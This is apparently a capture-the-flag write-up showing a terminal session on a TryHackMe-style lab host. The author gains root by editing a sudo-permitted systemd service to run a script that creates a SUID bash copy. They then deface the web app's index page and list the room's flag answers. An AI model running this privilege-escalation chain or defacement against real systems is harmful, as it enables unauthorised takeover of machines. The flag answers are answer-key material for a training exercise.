lrwxrwxrwx 1 root         root            9 Aug 10  2020 .bash_history -> /dev/null
-rw-r--r-- 1 server-admin server-admin  220 Aug 10  2020 .bash_logout
-rw-r--r-- 1 server-admin server-admin 3.7K Aug 10  2020 .bashrc
drwx------ 2 server-admin server-admin 4.0K Aug 10  2020 .cache
-rw-r----- 1 server-admin server-admin   18 Aug 10  2020 flag2.txt
drwx------ 3 server-admin server-admin 4.0K Aug 10  2020 .gnupg
-rw------- 1 root         root           31 Aug 10  2020 .lesshst
drwxr-xr-x 3 server-admin server-admin 4.0K Aug 10  2020 .local
-rw-r--r-- 1 server-admin server-admin  807 Aug 10  2020 .profile
-rw-r--r-- 1 server-admin server-admin    0 Aug 10  2020 .sudo_as_admin_successful
-rw------- 1 server-admin server-admin 2.9K Aug 12  2020 .viminfo
server-admin@duckyinc:~$ cat flag2.txt 
thm{4lm0st_th3re}

server-admin@duckyinc:~$ find / -perm -4000 2>/dev/null | xargs ls -lah
-rwsr-xr-x 1 root   root             31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root   root             43K Mar  5  2020 /bin/mount
-rwsr-xr-x 1 root   root             63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root   root             27K Mar  5  2020 /bin/umount
-rwsr-xr-x 1 root   root             40K Jan 27  2020 /snap/core/9665/bin/mount
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/9665/bin/ping
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/9665/bin/ping6
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/9665/bin/su
-rwsr-xr-x 1 root   root             27K Jan 27  2020 /snap/core/9665/bin/umount
-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/9665/usr/bin/chfn
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/9665/usr/bin/chsh
-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/9665/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/9665/usr/bin/newgrp
-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/9665/usr/bin/passwd
-rwsr-xr-x 1 root   root            134K Jan 31  2020 /snap/core/9665/usr/bin/sudo
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 11  2020 /snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            419K May 26  2020 /snap/core/9665/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root            109K Jul 10  2020 /snap/core/9665/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root   dip             386K Feb 11  2020 /snap/core/9665/usr/sbin/pppd
-rwsr-xr-x 1 root   root             40K Jan 27  2020 /snap/core/9804/bin/mount
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/9804/bin/ping
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/9804/bin/ping6
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/9804/bin/su
-rwsr-xr-x 1 root   root             27K Jan 27  2020 /snap/core/9804/bin/umount
-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/9804/usr/bin/chfn
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/9804/usr/bin/chsh
-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/9804/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/9804/usr/bin/newgrp
-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/9804/usr/bin/passwd
-rwsr-xr-x 1 root   root            134K Jan 31  2020 /snap/core/9804/usr/bin/sudo
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 11  2020 /snap/core/9804/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            419K May 26  2020 /snap/core/9804/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root            109K Jul 29  2020 /snap/core/9804/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root   dip             386K Feb 11  2020 /snap/core/9804/usr/sbin/pppd
-rwsr-sr-x 1 daemon daemon           51K Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root   root             40K Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root   root             59K Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root   root             22K Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root   root            146K Jan 31  2020 /usr/bin/sudo
-rwsr-xr-x 1 root   root             19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-- 1 root   messagebus       42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root             10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root            427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root             14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root   root            111K Jul 10  2020 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root   root             99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

server-admin@duckyinc:~$ sudo -l
[sudo] password for server-admin: 
Matching Defaults entries for server-admin on duckyinc:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User server-admin may run the following commands on duckyinc:
    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable
        duckyinc.service, /bin/systemctl restart duckyinc.service, /bin/systemctl
        daemon-reload, sudoedit /etc/systemd/system/duckyinc.service

https://gtfobins.github.io/gtfobins/systemctl/

server-admin@duckyinc:~$ cat /etc/systemd/system/duckyinc.service
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
User=flask-app
Group=www-data
WorkingDirectory=/var/www/duckyinc
ExecStart=/usr/local/bin/gunicorn --workers 3 --bind=unix:/var/www/duckyinc/duckyinc.sock --timeout 60 -m 007 app:app
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.target

server-admin@duckyinc:~$ sudoedit /etc/systemd/system/duckyinc.service
server-admin@duckyinc:~$ cat /etc/systemd/system/duckyinc.service 
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
User=root
Group=root
WorkingDirectory=/var/www/duckyinc
ExecStart=/bin/bash /tmp/ducky.sh
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.target

server-admin@duckyinc:~$ cd /tmp
server-admin@duckyinc:/tmp$ ls
systemd-private-aa64e3e936fe4b02a8e203e0941d434b-systemd-resolved.service-5I3qaT
systemd-private-aa64e3e936fe4b02a8e203e0941d434b-systemd-timesyncd.service-FHfynY
server-admin@duckyinc:/tmp$ nano ducky.sh
server-admin@duckyinc:/tmp$ cat ducky.sh 
#!/bin/bash
cp /bin/bash /tmp/sh
chmod +xs /tmp/sh

server-admin@duckyinc:/tmp$ sudo /bin/systemctl daemon-reload
server-admin@duckyinc:/tmp$ sudo /bin/systemctl restart duckyinc.service
server-admin@duckyinc:/tmp$ ls 
ducky.sh  systemd-private-aa64e3e936fe4b02a8e203e0941d434b-systemd-resolved.service-5I3qaT
sh        systemd-private-aa64e3e936fe4b02a8e203e0941d434b-systemd-timesyncd.service-FHfynY

server-admin@duckyinc:/tmp$ ls -l
total 1100
-rw-rw-r-- 1 server-admin server-admin      51 Mar 12 18:50 ducky.sh
-rwsr-sr-x 1 root         root         1113504 Mar 12 18:53 sh
drwx------ 3 root         root            4096 Mar 12 18:04 systemd-private-aa64e3e936fe4b02a8e203e0941d434b-systemd-resolved.service-5I3qaT
drwx------ 3 root         root            4096 Mar 12 18:04 systemd-private-aa64e3e936fe4b02a8e203e0941d434b-systemd-timesyncd.service-FHfynY

server-admin@duckyinc:/tmp$ /tmp/sh -p
sh-4.4# whoami
root
sh-4.4# cd /root
sh-4.4# ls
sh-4.4# ls -lah
total 52K
drwx------  7 root root 4.0K Aug 28  2020 .
drwxr-xr-x 24 root root 4.0K Aug  9  2020 ..
drwxr-xr-x  2 root root 4.0K Aug 12  2020 .bash_completion.d
lrwxrwxrwx  1 root root    9 Aug 10  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.2K Aug 12  2020 .bashrc
drwx------  3 root root 4.0K Aug  9  2020 .cache
drwx------  3 root root 4.0K Aug  9  2020 .gnupg
drwxr-xr-x  5 root root 4.0K Aug 12  2020 .local
-rw-------  1 root root  485 Aug 10  2020 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Aug 10  2020 .selected_editor
drwx------  2 root root 4.0K Aug  9  2020 .ssh
-rw-------  1 root root 7.6K Aug 12  2020 .viminfo
sh-4.4# cd .bash_completion.d
sh-4.4# ls
python-argcomplete
sh-4.4# cat python-argcomplete 
# Copyright 2012-2019, Andrey Kislyuk and argcomplete contributors.
# Licensed under the Apache License. See https://github.com/kislyuk/argcomplete for more info.

# Copy of __expand_tilde_by_ref from bash-completion
__python_argcomplete_expand_tilde_by_ref () {
    if [ "${!1:0:1}" = "~" ]; then
        if [ "${!1}" != "${!1//\/}" ]; then
            eval $1="${!1/%\/*}"/'${!1#*/}';
        else
            eval $1="${!1}";
        fi;
    fi
}

# Run something, muting output or redirecting it to the debug stream
# depending on the value of _ARC_DEBUG.
# If ARGCOMPLETE_USE_TEMPFILES is set, use tempfiles for IPC.
__python_argcomplete_run() {
    if [[ -z "$ARGCOMPLETE_USE_TEMPFILES" ]]; then
        __python_argcomplete_run_inner "$@"
        return
    fi
    local tmpfile="$(mktemp)"
    _ARGCOMPLETE_STDOUT_FILENAME="$tmpfile" __python_argcomplete_run_inner "$@"
    local code=$?
    cat "$tmpfile"
    rm "$tmpfile"
    return $code
}

__python_argcomplete_run_inner() {
    if [[ -z "$_ARC_DEBUG" ]]; then
        "$@" 8>&1 9>&2 1>/dev/null 2>&1
    else
        "$@" 8>&1 9>&2 1>&9 2>&1
    fi
}

# Scan the beginning of an executable file ($1) for a regexp ($2). By default,
# scan for the magic string indicating that the executable supports the
# argcomplete completion protocol. By default, scan the first kilobyte;
# if $3 is set to -n, scan until the first line break up to a kilobyte.
__python_argcomplete_scan_head() {
    read -s -r ${3:--N} 1024 < "$1"
    [[ "$REPLY" =~ ${2:-PYTHON_ARGCOMPLETE_OK} ]]
}

__python_argcomplete_scan_head_noerr() {
    __python_argcomplete_scan_head "$@" 2>/dev/null
}

_python_argcomplete_global() {
    local executable=$1
    __python_argcomplete_expand_tilde_by_ref executable

    local ARGCOMPLETE=0
    if [[ "$executable" == python* ]] || [[ "$executable" == pypy* ]]; then
        if [[ "${COMP_WORDS[1]}" == -m ]]; then
            if __python_argcomplete_run "$executable" -m argcomplete._check_module "${COMP_WORDS[2]}"; then
                ARGCOMPLETE=3
            else
                return
            fi
        elif [[ -f "${COMP_WORDS[1]}" ]] && __python_argcomplete_scan_head_noerr "${COMP_WORDS[1]}"; then
            local ARGCOMPLETE=2
        else
            return
        fi
    elif type -P "$executable" >/dev/null 2>&1; then
        local SCRIPT_NAME=$(type -P "$executable")
        if (type -t pyenv && [[ "$SCRIPT_NAME" = $(pyenv root)/shims/* ]]) >/dev/null 2>&1; then
            local SCRIPT_NAME=$(pyenv which "$executable")
        fi
        if __python_argcomplete_scan_head_noerr "$SCRIPT_NAME"; then
            local ARGCOMPLETE=1
        elif __python_argcomplete_scan_head_noerr "$SCRIPT_NAME" '^#!(.*)$' -n && [[ "${BASH_REMATCH[1]}" =~ ^.*(python|pypy)[0-9\.]*$ ]]; then
            local interpreter="$BASH_REMATCH"
            if (__python_argcomplete_scan_head_noerr "$SCRIPT_NAME" "(PBR Generated)|(EASY-INSTALL-(SCRIPT|ENTRY-SCRIPT|DEV-SCRIPT))" \
                && "$interpreter" "$(type -P python-argcomplete-check-easy-install-script)" "$SCRIPT_NAME") >/dev/null 2>&1; then
                local ARGCOMPLETE=1
            elif __python_argcomplete_run "$interpreter" -m argcomplete._check_console_script "$SCRIPT_NAME"; then
                local ARGCOMPLETE=1
            fi
        fi
    fi

    if [[ $ARGCOMPLETE != 0 ]]; then
        local IFS=$(echo -e '\v')
        COMPREPLY=( $(_ARGCOMPLETE_IFS="$IFS" \
            COMP_LINE="$COMP_LINE" \
            COMP_POINT="$COMP_POINT" \
            COMP_TYPE="$COMP_TYPE" \
            _ARGCOMPLETE_COMP_WORDBREAKS="$COMP_WORDBREAKS" \
            _ARGCOMPLETE=$ARGCOMPLETE \
            _ARGCOMPLETE_SUPPRESS_SPACE=1 \
            __python_argcomplete_run "$executable" "${COMP_WORDS[@]:1:ARGCOMPLETE-1}") )
        if [[ $? != 0 ]]; then
            unset COMPREPLY
        elif [[ "$COMPREPLY" =~ [=/:]$ ]]; then
            compopt -o nospace
        fi
    else
        type -t _completion_loader | grep -q 'function' && _completion_loader "$@"
    fi
}
complete -o default -o bashdefault -D -F _python_argcomplete_global

need to deface it

sh-4.4# ls /var/www/
duckyinc
sh-4.4# ls /var/www/duckyinc/
app.py	__pycache__  requirements.txt  static  templates
sh-4.4# ls /var/www/duckyinc/templates
404.html  500.html  admin.html	base.html  contact.html  index.html  login.html  product.html  products.html

sh-4.4# head /var/www/duckyinc/templates/index.html
{% extends "base.html" %}


{% block content %}

<div id="index-banner" class="parallax-container">
  <div class="section no-pad-bot">
    <div class="container">
      <h1 class="header center white-text"><strong>Rubber Ducky Inc Defaced</strong></h1>
      <div class="row center">

sh-4.4# ls /root
flag3.txt
sh-4.4# cat /root/flag3.txt 
thm{m1ss10n_acc0mpl1sh3d}


```

![[Pasted image 20230312132013.png]]


flag1

*thm{br3ak1ng_4nd_3nt3r1ng}*

flag2

*thm{4lm0st_th3re}*

flag3

Mission objectives

*thm{m1ss10n_acc0mpl1sh3d}*


[[HA Joker CTF]]